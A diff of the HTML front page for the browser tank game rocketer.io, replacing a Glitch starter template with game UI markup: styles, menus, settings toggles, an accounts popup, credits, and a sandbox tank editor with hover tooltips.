+      .tankObjectHide > *:not(:nth-child(1)) {/*hides the buttons and inputs from a tank object, like a barrel. ex: shows or hides "barrel type"*/
+          display: none;
+      }
+      
+      #sandbox, #sandbox2, #sandbox3 {
+        animation-name: editDivAppear;
+        animation-duration: 0.2s;
+      }
+      @keyframes editDivAppear {
+        from {
+          opacity: 0.0;
+        }
+        to {
+          opacity: 1.0;
+        }
+      }
+      
+      /*info that appears when hovering over property name in tank editor*/
+      #tank-editor-text:hover ~ #dropdown {
+        display: block;
+      }
+      #tank-editor-text2:hover ~ #dropdown2 {
+        display: block;
+      }
+      #tank-editor-text3:hover ~ #dropdown3 {
+        display: block;
+      }
+      #tank-editor-text4:hover ~ #dropdown4 {
+        display: block;
+      }
+      #tank-editor-text5:hover ~ #dropdown5 {
+        display: block;
+      }
+      #tank-editor-text6:hover ~ #dropdown6 {
+        display: block;
+      }
+      #tank-editor-text7:hover ~ #dropdown7 {
+        display: block;
+      }
+      #tank-editor-text8:hover ~ #dropdown8 {
+        display: block;
+      }
+      #tank-editor-text9:hover ~ #dropdown9 {
+        display: block;
+      }
+      #tank-editor-text10:hover ~ #dropdown10 {
+        display: block;
+      }
+      #tank-editor-text11:hover ~ #dropdown11 {
+        display: block;
+      }
+      #tank-editor-text12:hover ~ #dropdown12 {
+        display: block;
+      }
+      #tank-editor-text13:hover ~ #dropdown13 {
+        display: block;
+      }
+      #tank-editor-text14:hover ~ #dropdown14 {
+        display: block;
+      }
+      #tank-editor-text15:hover ~ #dropdown15 {
+        display: block;
+      }
+      
+      /*toggle switch in settings*/
+      /* The switch - the box around the slider */
+      .switch {
+        position: relative;
+        display: inline-block;
+        width: 60px;
+        height: 25px;
+      }
+
+      /* Hide default HTML checkbox */
+      .switch input {
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+
+
+      input:checked + .slider {
+        background-color: #38b764;
+      }
+
+      input:focus + .slider {
+        box-shadow: 0 0 1px #38b764;
+      }
+
+      input:checked + .slider:before {
+        -webkit-transform: translateX(34px);
+        -ms-transform: translateX(34px);
+        transform: translateX(34px);
+      }
+
+      /* Rounded sliders */
+      .slider.round {
+        position: absolute;
+        cursor: pointer;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: black;
+        border: none;
+        -webkit-transition: .4s;
+        transition: .4s;
+        border-radius: 25px;
+        height: 25px;
+        width: 60px;
+        opacity: 1;
+      }
+
+      .slider.round:before {
+        position: absolute;
+        content: "";
+        height: 17px;
+        width: 17px;
+        left: 4px;
+        bottom: 4px;
+        background-color: white;
+        -webkit-transition: .4s;
+        transition: .4s;
+        border-radius: 50%;
+      }
+      
+      .modal{
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        line-height: 1.5;
+        -webkit-font-smoothing: antialiased;
+        font-size: 1vmin;
+        box-sizing: border-box;
+        background-color: rgba(0,0,0,.5);
+        border-radius: .5vmin;
+        box-shadow: 0 0 0 .4vmin #000;
+        color: #fff;
+        font-family: Roboto;
+        font-weight: 700;
+        left: 50%;
+        opacity: 1;
+        padding: 2vmin 3vmin;
+        position: fixed;
+        text-align: center;
+        top: 50%;
+        -webkit-transform: translateY(-50%) translateX(-50%);
+        transition: top .5s,opacity .5s;
+        display: none;
+      }
+      .modalButton{
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        -webkit-font-smoothing: antialiased;
+        box-sizing: border-box;
+        line-height: inherit;
+        overflow: visible;
+        text-transform: none;
+        -webkit-appearance: button;
+        border: none;
+        outline: none;
+        padding: .3vmin 4vmin;
+        transition: background-color .2s ease;
+        cursor: pointer;
+        margin-bottom: .5vmin;
+        margin-top: .5vmin;
+        background-color: rgba(0,0,0,.5);
+        border-radius: .5vmin;
+        box-shadow: 0 0 0 .4vmin #000;
+        color: #fff;
+        font-family: Roboto;
+        font-size: 1.8vmin;
+        font-weight: 700;
+        height: auto;
+        margin-left: 1vmin;
+        margin-right: 1vmin;
+        padding-left: 1vmin;
+        padding-right: 1vmin;
+        text-align: center;
+        white-space: nowrap;
+        width: auto;
+      }
+      .modalText{
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        line-height: 1.5;
+        -webkit-font-smoothing: antialiased;
+        color: #fff;
+        box-sizing: border-box;
+        font-size: 3.5vmin;
+        text-align: center;
+        font-family: Roboto;
+        font-weight: 700;
+        margin-bottom: .5vmin;
+        margin-top: .5vmin;
+      }
+      .modalTextSmall{
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        line-height: 1.5;
+        -webkit-font-smoothing: antialiased;
+        color: #fff;
+        box-sizing: border-box;
+        font-size: 2vmin;
+        font-family: Roboto;
+        font-weight: 400;
+        margin: 1vmin;
+        text-align: center;
+        margin-bottom: .5vmin;
+        margin-top: .5vmin;
+        overflow-y: scroll;
+        max-height: 70vh;
+      }
+      
+      #menuTitle {
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        line-height: 1.5;
+        -webkit-font-smoothing: antialiased;
+        box-sizing: border-box;
+        font-size: 8vmin;
+        top: 1vmin;
+        -webkit-text-stroke-width: .3vmin;
+        -webkit-text-stroke-color: #000;
+        align-items: center;
+        color: #fff;
+        font-family: Roboto;
+        font-weight: 900;
+        height: 5vmin;
+        left: 50%;
+        pointer-events: none;
+        position: absolute;
+        text-align: center;
+        -webkit-transform: translateY(-50%) translateX(-50%);
+        user-select: none;
+        display: none;
+      }
+      #subtitle {
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        line-height: 1.5;
+        -webkit-font-smoothing: antialiased;
+        box-sizing: border-box;
+        -webkit-text-stroke-width: .3vmin;
+        -webkit-text-stroke-color: #000;
+        align-items: center;
+        color: #fff;
+        font-family: Roboto;
+        font-weight: 900;
+        height: 5vmin;
+        left: 50%;
+        pointer-events: none;
+        position: absolute;
+        text-align: center;
+        -webkit-transform: translateY(-50%) translateX(-50%);
+        font-size: 4vmin;
+        top: 10vmin;
+        transition: opacity .5s,top .5s;
+        user-select: none;
+        display: none;
+      }
+      
+      #advert {
+        text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        font-size: 3vmin;
+        bottom: 6vw;
+        align-items: center;
+        color: #fff;
+        font-weight: 900;
+        font-family: "Roboto", sans-serif;
+        height: 5vmin;
+        right: 14vw;
+        pointer-events: none;
+        position: absolute;
+        text-align: right;
+        user-select: none;
+      }
+    </style>
   </head>
   <body>
-    <!--
-      The body includes the content you see in the page
-      Each element is defined using tags, like this <div></div>
-      The attributes like class="wrapper" let us style elements in the CSS
-    -->
-    <div class="wrapper">
-      <div class="content" role="main">
-        <h1 class="title">Hello World!</h1>
-        <img
-          src="https://cdn.glitch.com/a9975ea6-8949-4bab-addb-8a95021dc2da%2Fillustration.svg?v=1618177344016"
-          class="illustration"
-          alt="Editor illustration"
-          title="Click the image!"
-        />
-        <div class="instructions">
-          <h2>Using this project</h2>
-          <p>
-            This is the Glitch <strong>Hello Website</strong> project. You can
-            use it to build your own site. Check out the code in the editor and open
-            the <span class="fileopener" data-file="TODO.md" data-line="0"
-              >TODO</span> for next steps!
-          </p>
-          <!--  🚧 TODO: ADD BUTTON HERE -->
+    <canvas id="game"></canvas>
+    <canvas id="homePage"></canvas>
+    <input
+      type="text"
+      id="gamename"
+      placeholder="Player name"
+      autocomplete="off"
+    />
+    <button id="play" type="button" onclick="gameStart = 1;randomNotif();">PLAY</button>
+    <div id="respawnScoreDiv"></div>
+    <input type="text" id="chat" placeholder="Chat" onfocus="sendTypingIndicator()" onblur="removeTypingIndicator()" />
+    <input type="password" id="devtoken" placeholder="Dev or Admin token..." />
+    <div class="hidetoken">Please don't use password managers</div>
+    <div id="menuTitle">rocketer.io</div>
+    <div id="subtitle"></div>
+    <div id="advert">Join our discord server! <span style="font-size: 5vmin;">&#8628;</span></div>
 
-          <!-- Once you've added the button from TODO.md, click it in the page -->
-          <!-- Check out the function in script.js to see how it works -->
-        </div>
+    <link
+      href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&family=Yantramanav:wght@900&display=swap"
+      rel="stylesheet"
+    />
+
+    
+    <div id="changelogDisplay" style="line-height: 1.4; color: white; font-size: 1vw; position: fixed; top: 1vw; left: 1.05vw; font-weight: 900; font-family: Roboto, sans-serif; text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;pointer-events: none;"></div>
+    <button id="featuredyoutuber">
+      <img id="youtuberimage" />
+      <span id="youtubername"> Randomly choosing from a list... </span>
+    </button>
+
+    <div id="screenDarken"></div>
+    <div id="screenLighten"></div>
+    <button id="changelog">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: absolute;
+          top: calc(50% - 1.1vw);
+          left: calc(50% - 1.1vw);
+          text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        "
+      >
+        article
+      </span>
+    </button>
+    <div class="hide">Changelog</div>
+    <div id="changelogPopup">
+      <div id="closePopup">&#10006;</div>
+      <div id="changelogwords">Loading...</div>
+    </div>
+    <button id="accounts">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: relative;
+          top: calc(50% - 1.3vw);
+          text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        "
+      >
+        person </span
+      ><span id="accountName" style="text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;">Log In</span>
+    </button>
+    <div class="hide7">Accounts</div>
+    <div id="accountsPopup">
+      <div id="accountBox">
+        <h3>Accounts</h3>
+        <hr />
+        <div id="accountText" class="accountTitleThingy"></div>
+        <button
+          id="signUp"
+          type="button"
+          onclick="acctype='signup';accountsignup();"
+        >
+          Sign Up</button
+        ><br /><button
+          id="logIn"
+          type="button"
+          onclick="acctype='login';accountsignup();"
+        >
+          Log In</button
+        ><br /><button
+          id="editAccount"
+          type="button"
+          onclick="acctype='edit';accountsignup();"
+        >
+          Edit Account</button
+        ><br /><input
+          type="text"
+          id="accountUsername"
+          placeholder="Username"
+        /><br /><input
+          type="text"
+          id="accountPassword"
+          placeholder="Password"
+        /><br /><input
+          type="text"
+          id="accountDesc"
+          placeholder="Account description"
+        /><br /><button
+          id="logInButton"
+          type="button"
+          onclick="providedUsername();"
+        >
+          done
+        </button>
+      </div>
+      <div id="closeAccountsPopup">&#10006;</div>
+    </div>
+    <button id="settings">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: absolute;
+          top: calc(50% - 1.1vw);
+          left: calc(50% - 1.1vw);
+          text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        "
+      >
+        settings
+      </span>
+    </button>
+    <div class="hide3">Settings</div>
+
+    <div id="settingsPopup">
+      <span style="font-weight: 700; font-size: 25px;">Shape Customization</span><hr>
+      <div class="radiantsizeslider">
+        Radiant aura size: <span id="sizevalue"></span
+        ><input
+          type="range"
+          min="1"
+          max="10"
+          value="5"
+          class="slider"
+          id="radiantSizeRange"
+        />
+      </div>
+      <div>
+        <br />Shape color theme: <select
+          id="theme"
+          onchange="changetheme(this)"
+        >
+          <option value="default">Default Theme</option>
+          <option value="oldtheme">Old Theme</option>
+        </select>
+      </div>
+      <br /><span style="font-weight: 700; font-size: 25px;">Graphics</span><hr>Dune Particles
+      <label class="switch">
+        <input type="checkbox" settingid="spawnduneparticle" onclick="toggleParticle()">
+        <span class="slider round"></span>
+      </label>
+      <br><br>Crossroad Particles
+      <label class="switch">
+        <input type="checkbox" settingid="spawncrossroadsparticle" onclick="toggleCrParticle()">
+        <span class="slider round"></span>
+      </label>
+      <br><br>Radiant Shape Particles
+      <label class="switch">
+        <input type="checkbox" settingid="spawnradparticle" onclick="toggleRadParticle()">
+        <span class="slider round"></span>
+      </label>
+       <br><br>Show Shape Information
+      <label class="switch">
+        <input type="checkbox" settingid="showshapeinfo" onclick="toggleName()">
+        <span class="slider round"></span>
+      </label>
+      <br><br>Show Static Mob Names
+      <label class="switch">
+        <input type="checkbox" settingid="showStaticMobName" onclick="toggleStatic()">
+        <span class="slider round"></span>
+      </label>
+      <br><br>Show Dune Minion Names
+      <label class="switch">
+        <input type="checkbox" settingid="showMinionMobName" onclick="toggleMinion()">
+        <span class="slider round"></span>
+      </label>
+      <br /><br /><span style="font-weight: 700; font-size: 25px;">UI customization</span><hr>Show tank upgrade stats
+      <label class="switch">
+        <input type="checkbox" settingid="showstats" onclick="toggleStats()">
+        <span class="slider round"></span>
+      </label>
+      <br /><br /><span style="font-weight: 700; font-size: 25px;">Controls</span><hr>- Mouse: Take Aim<br />- W,A,S,D /
+      Arrow Keys: Move your tank<br />- E: Toggle Auto-Fire<br />- C: Toggle
+      Auto-Rotate<br />- F: Toggle Fast Auto-Rotate (3x faster)<br />- U: Toggle Body Upgrade
+      Tree<br />- Y: Toggle Weapon Upgrade Tree<br />- M: Toggle Debug Mode<br />- P: Passive Mode (you won't deal damage to tanks)<br />- O: Open Settings<br />- H: Toggle Hitbox<br>- X: Spin Lock
+      <br>- Left Click / Space Bar: Shoot<br>- Right Click/Shift: Repel Drones
+      <br /><br /><span style="font-weight: 700; font-size: 25px;">Credits</span><hr>Infinite-3D, who created scenexe.io which rocketer is based on (unfortunately he has given up on that game)
+      <br><br>Rocketer developer:<br>Farmer (quack1773)<br><br>Co-developers:<br>Lineegg<br>Saith<br>Delphi<br>Neondette<br>Crabby
+      <div id="closeSettingsPopup"><div>&#10006;</div></div>
+    </div>
+    
+    <button id="wrlb">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: absolute;
+          top: calc(50% - 1.1vw);
+          left: calc(50% - 1.1vw);
+          text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        "
+      >
+        leaderboard
+      </span>
+    </button>
+    <div class="hide6">World record leaderboard</div>
+
+    <div id="wrlbPopup">
+      <div id="wrwords">Searching for record holder...</div>
+      <div id="closewrlbPopup">&#10006;</div>
+    </div>
+
+    <button id="howToPlay">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: absolute;
+          top: calc(50% - 1.1vw);
+          left: calc(50% - 1.1vw);
+          text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        "
+        onclick="window.open('https://rocketer.fandom.com/wiki/Rocketer_Wiki')"
+      >
+        question_mark
+      </span>
+    </button>
+    <div class="hide2">Fanmade Wiki</div>
+    <button id="discord">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: absolute;
+          top: calc(50% - 1.1vw);
+          left: calc(50% - 1.1vw);
+          text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        "
+        onclick="window.open('https://discord.com/invite/R83VfCXDFN')"
+      >
+        discord
+      </span>
+    </button>
+    <div class="hide4">Join our Discord community!</div>
+    <button id="reddit">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: absolute;
+          top: calc(50% - 1.1vw);
+          left: calc(50% - 1.1vw);
+          text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+        "
+        onclick="window.open('https://www.reddit.com/r/rocketer/')"
+      >
+        reddit
+      </span>
+    </button>
+    <div class="hide5">Join our Reddit community!</div>
+    <div id="notifFlex"></div>
+    <button id="continue" onclick="exitDeathScreen()">Continue</button>
+    
+    <div class="modal"><h1 id="message-popup-title" class="modalText">Timed out</h1><hr><p id="message-popup-text"  class="modalTextSmall" style="overflow-y: scroll; max-height: 70vh;padding: 0.5vw;">Client did not send ping in 20000ms</p><hr><button id="ok-button" class="modalButton">OK</button></div>
+    
+    <div id="sandbox" style="overflow-y:auto;display:none;font-size: 1.5vw;position: fixed;top:5px;left:5px;width:25%;height:93%;background-color:rgba(15,15,15,.5);color:white;border-radius: 0.5vw;font-weight: 700;font-family: Roboto, sans-serif;border: 3px solid black;">
+      <div id="sandbox-title" class="sandboxText" style="font-size:1.8vw;top:1vw;left:1vw;">
+        Tank Editor
+      </div>
+      <input id="tank-name" autocomplete="off" placeholder="Name" class="sandboxInput" style="top:4vw;left:1vw;">
+      <div id="tank-editor-text" class="sandboxText" style="font-size:1vw;top:4.3vw;left:11vw;">
+        Override Tank Name (WIP)
+      </div>
+      <select name="team" id="team-select" class="sandboxSelect" style="top:6.2vw;left:1vw;">
+        <option value="none">None</option>
+        <option value="red">Red</option>
+        <option value="green">Green</option>
+        <option value="blue">Blue</option>
+        <option value="purple">Purple</option>
+        <option value="eternal">Eternal</option>
+        <option value="magenta">Magenta</option>
+        <option value="fallen">Fallen</option>
+        <option value="celestial">Scenexe Celestial</option>
+        <option value="barrel">Barrel</option>
+        <option value="asset">Asset</option>
+        <option value="triangle">Triangle</option>
+        <option value="square">Square</option>
+        <option value="pentagon">Pentagon</option>
+        <option value="hexagon">Hexagon</option>
+        <option value="heptagon">Heptagon</option>
+        <option value="octagon">Octagon</option>
+        <option value="nonagon">Nonagon</option>
+        <option value="decagon">Decagon</option>
+        <option value="hendecagon">Hendecagon</option>
+        <option value="dodecagon">Dodecagon</option>
+        <option value="tridecagon">Tridecagon</option>
+        <option value="tetradecagon">Tetradecagon black</option>
+        <option value="transparent">Transparent</option>
+      </select>
+      <div id="tank-editor-text2" class="sandboxText" style="font-size:1vw;top:6.5vw;left:11vw;">
+        Team
+      </div>
+      <input id="tank-rad" autocomplete="off" placeholder="0 - 5" class="sandboxInput" style="top:8.6vw;left:1vw;width:4vw;" value="0">
+      <div id="tank-editor-text3" class="sandboxText" style="font-size:1vw;top:8.9vw;left:7vw;">
+        Radiant Lvl
+      </div>
+      <input id="tank-xp" autocomplete="off" placeholder="Score" class="sandboxInput" style="top:10.8vw;left:1vw;width:4vw;" value="0">
+      <div id="tank-editor-text4" class="sandboxText" style="font-size:1vw;top:11.1vw;left:7vw;">
+        Player Score
+      </div>
+      <input id="tank-size" autocomplete="off" placeholder="Width" class="sandboxInput" style="top:13vw;left:1vw;width:4vw;" value="25">
+      <div id="tank-editor-text5" class="sandboxText" style="font-size:1vw;top:13.3vw;left:7vw;">
+        Tank Size
+      </div>
+      <div id="sandbox-title2" class="sandboxText" style="top:15.5vw;left:1vw;">
+        Weapon
+      </div>
+      <input id="weapon-name" autocomplete="off" placeholder="Weapon Name" class="sandboxInput" style="top:18vw;left:1vw;" value="basic">
+      <div id="tank-editor-text6" class="sandboxText" style="font-size:1vw;top:18.3vw;left:11vw;">
+        Weapon Upgrade Name
+      </div>
+      <input id="weapon-fov" autocomplete="off" placeholder="1 - 5" class="sandboxInput" style="top:20.2vw;left:1vw;width:4vw;" value="1">
+      <div id="tank-editor-text7" class="sandboxText" style="font-size:1vw;top:20.5vw;left:7vw;">
+        FoV Multiplier
+      </div>
+      <button id="barrels" class="sandboxButton" style="top:22.5vw;left:1vw;" onclick="openBarrelUI()">
+        Barrels (0)
+      </button>
+      <div id="sandbox-title3" class="sandboxText" style="top:25.2vw;left:1vw;">
+        Body
+      </div>
+      <input id="body-name" autocomplete="off" placeholder="Body Name" class="sandboxInput" style="top:27.7vw;left:1vw;" value="node">
+      <div id="tank-editor-text8" class="sandboxText" style="font-size:1vw;top:28vw;left:11vw;">
+        Body Upgrade Name
+      </div>
+      <input id="turret-base" autocomplete="off" placeholder="Turret Base Size" class="sandboxInput" style="top:29.9vw;left:1vw;width:4vw;" value="0">
+      <div id="tank-editor-text15" class="sandboxText" style="font-size:1vw;top:30.2vw;left:7vw;">
+        Turret Base Size (NEW)
+      </div>
+      <input id="body-sides" autocomplete="off" placeholder="Body sides" class="sandboxInput" style="top:32.1vw;left:1vw;width:4vw;" value="0">
+      <div id="tank-editor-text9" class="sandboxText" style="font-size:1vw;top:32.4vw;left:7vw;">
+        Sides
+      </div>
+      <input id="body-health" autocomplete="off" placeholder="Max Health" class="sandboxInput" style="top:34.3vw;left:1vw;width:4vw;" value="100">
+      <div id="tank-editor-text10" class="sandboxText" style="font-size:1vw;top:34.6vw;left:7vw;">
+        Health
+      </div>
+      <input id="body-regen" autocomplete="off" placeholder="Health Regen" class="sandboxInput" style="top:36.5vw;left:1vw;width:4vw;" value="1">
+      <div id="tank-editor-text11" class="sandboxText" style="font-size:1vw;top:36.8vw;left:7vw;">
+        Health Regeneration
+      </div>
+      <input id="body-regen-time" autocomplete="off" placeholder="Health Regen Time" class="sandboxInput" style="top:38.7vw;left:1vw;width:4vw;" value="100">
+      <div id="tank-editor-text12" class="sandboxText" style="font-size:1vw;top:39vw;left:7vw;">
+        Health Regeneration Wait
+      </div>
+      <input id="body-damage" autocomplete="off" placeholder="Body Damage" class="sandboxInput" style="top:40.9vw;left:1vw;width:4vw;" value="0.1">
+      <div id="tank-editor-text13" class="sandboxText" style="font-size:1vw;top:41.2vw;left:7vw;">
+        Body Damage
+      </div>
+      <input id="body-speed" autocomplete="off" placeholder="Speed" class="sandboxInput" style="top:43.1vw;left:1vw;width:4vw;" value="10">
+      <div id="tank-editor-text14" class="sandboxText" style="font-size:1vw;top:43.4vw;left:7vw;">
+        Body Speed
+      </div>
+      <button id="turrets" class="sandboxButton" style="top:45.2vw;left:1vw;" onclick="openBBUI()">
+        Gadgets (0)
+      </button>
+      <button id="assets" class="sandboxButton" style="top:47.7vw;left:1vw;" onclick="openAssetUI()">
+        Assets (0)
+      </button>
+      <button id="tanksections" class="sandboxButton" style="top:50.2vw;left:1vw;" onclick="openAssetUI()">
+        Tank Sections (WIP)
+      </button>
+      
+      <div id="dropdown" class="sandboxHover" style="font-size:1vw;top:5.7vw;left:11vw;">
+        This property does not work yet.
+      </div>
+      <div id="dropdown2" class="sandboxHover" style="font-size:1vw;top:8vw;left:11vw;">
+        Player's team. You cannot damage players on your team, unless it is set to none.
+      </div>
+      <div id="dropdown3" class="sandboxHover" style="font-size:1vw;top:10.5vw;left:7vw;">
+        Makes your tank radiant. Default is 0, maximum is 5.
+      </div>
+      <div id="dropdown4" class="sandboxHover" style="font-size:1vw;top:12.6vw;left:7vw;">
+        Changes the tank score. The limit is 1t.
+      </div>
+      <div id="dropdown5" class="sandboxHover" style="font-size:1vw;top:14.8vw;left:7vw;">
+        Changes tank size. This may affected barrels. The limit is 250.
+      </div>
+      <div id="dropdown6" class="sandboxHover" style="font-size:1vw;top:19.8vw;left:11vw;">
+        Overrides weapon name.
+      </div>
+      <div id="dropdown7" class="sandboxHover" style="font-size:1vw;top:22vw;left:7vw;">
+        Your tank's field of vision. Limit is 10.
+      </div>
+      <div id="dropdown8" class="sandboxHover" style="font-size:1vw;top:29.5vw;left:11vw;">
+        Overrides body name.
+      </div>
+      <div id="dropdown15" class="sandboxHover" style="font-size:1vw;top:31.7vw;left:7vw;">
+        Changes the size of turret base. Number range is 0 to 1.
+      </div>
+      <div id="dropdown9" class="sandboxHover" style="font-size:1vw;top:33.9vw;left:7vw;">
+        Changes your tank's shape. Negative sides create star shapes. Default is 0.
+      </div>
+      <div id="dropdown10" class="sandboxHover" style="font-size:1vw;top:36.1vw;left:7vw;">
+        Changes maximum health of tank. The actual health does not change.
+      </div>
+      <div id="dropdown11" class="sandboxHover" style="font-size:1vw;top:38.3vw;left:7vw;">
+        Amount of health added every 30ms. A negative value would result in reduction of health.
+      </div>
+      <div id="dropdown12" class="sandboxHover" style="font-size:1vw;top:40.5vw;left:7vw;">
+        Amount of time waited before health starts the regenerate. Time is this value multiplied by 30ms.
+      </div>
+      <div id="dropdown13" class="sandboxHover" style="font-size:1vw;top:42.7vw;left:7vw;">
+        Player's body damage. A negative value would increase the victim's health.
+      </div>
+      <div id="dropdown14" class="sandboxHover" style="font-size:1vw;top:44.9vw;left:7vw;">
+        Player's speed. A negative value would prevent tank from moving.
       </div>
     </div>
-    <!-- The footer holds our remix button — you can keep or delete it ✂ -->
-    <footer class="footer">
-      <div class="links"></div>
-      <a
-        class="btn--remix"
-        target="_top"
-        href="https://glitch.com/edit/#!/remix/glitch-hello-website"
+    <div id="sandbox2" style="display:none;font-size: 1.5vw;position: fixed;top:5px;right:5px;width:25%;height:93%;background-color:rgba(15,15,15,.5);color:white;border-radius: 0.5vw;font-weight: 700;font-family: Roboto, sans-serif;border: 3px solid black;">
+      <div id="sandbox-title4" class="sandboxText" style="font-size:1.8vw;top:1vw;right:1vw;">
+        Import/Export
+      </div>
+      <textarea id="import-code" autocomplete="off" placeholder="Paste your tank code here" class="sandboxInput" style="top:4vw;right:1vw;width:20vw;height:7vw;resize:none;"></textarea>
+      <button id="import" class="sandboxButton" style="top:12.5vw;right:1vw;" onclick="sendTankCode()">
+        Import tank code
+      </button>
+      <button id="export" class="sandboxButton" style="top:16.5vw;right:1vw;" onclick="getTankCode()">
+        Export current tank
+      </button>
+    </div>
+    <div id="sandbox3" style="display:none;font-size: 1.5vw;position: fixed;top:5px;left:calc(25% + 5px);width:25%;height:93%;background-color:rgba(15,15,15,.5);color:white;border-radius: 0.5vw;font-weight: 700;font-family: Roboto, sans-serif;border: 3px solid black;">
+      <div id="sandbox-title5" class="sandboxText" style="top:1vw;left:2vw;">
+        Barrels
+      </div>
+      <button id="newbarrel" class="sandboxButton" style="top:3.5vw;left:2vw;" onclick="addBarrelDiv()">
+        Add Barrel
+      </button>
+      <div id="barrelUI" style="position: absolute;top: 5.5vw;left:2vw;height:calc(100% - 5.5vw);width:calc(100% - 2vw);overflow-y:auto;"></div>
+    </div>
+    <div id="sandbox4" style="display:none;font-size: 1.5vw;position: fixed;top:5px;left:calc(25% + 5px);width:25%;height:93%;background-color:rgba(15,15,15,.5);color:white;border-radius: 0.5vw;font-weight: 700;font-family: Roboto, sans-serif;border: 3px solid black;">
+      <div id="sandbox-title6" class="sandboxText" style="top:1vw;left:2vw;">
+        Assets
+      </div>
+      <button id="newasset" class="sandboxButton" style="top:3.5vw;left:2vw;" onclick="addAssetDiv()">
+        Add Asset
+      </button>
+      <div id="assetUI" style="position: absolute;top: 5.5vw;left:2vw;height:calc(100% - 5.5vw);width:calc(100% - 2vw);overflow-y:auto;"></div>
+    </div>
+    <div id="sandbox5" style="display:none;font-size: 1.5vw;position: fixed;top:5px;left:calc(25% + 5px);width:25%;height:93%;background-color:rgba(15,15,15,.5);color:white;border-radius: 0.5vw;font-weight: 700;font-family: Roboto, sans-serif;border: 3px solid black;">
+      <div id="sandbox-title7" class="sandboxText" style="top:1vw;left:2vw;">
+        Gadgets
+      </div>
+      <button id="newbb" class="sandboxButton" style="top:3.5vw;left:2vw;" onclick="addBBDiv()">
+        Add Gadget
+      </button>
+      <div id="bbUI" style="position: absolute;top: 5.5vw;left:2vw;height:calc(100% - 5.5vw);width:calc(100% - 2vw);overflow-y:auto;"></div>
+    </div>
+    
+    <button id="openEditor">
+      <span
+        class="material-icons"
+        style="
+          font-size: 2.2vw;
+          position: absolute;
+          top: calc(50% - 1.1vw);
+          right: calc(50% - 1.1vw);
+        "
+        onclick="openEditorUI()"
       >
-        <img
-          src="https://cdn.glitch.com/605e2a51-d45f-4d87-a285-9410ad350515%2FLogo_Color.svg?v=1618199565140"
-          alt=""
-        />
-        Remix on Glitch
-      </a>
-    </footer>
+        edit
+      </span>
+    </button>
+    
+    <script src="https://code.jquery.com/jquery-1.11.1.js"></script>
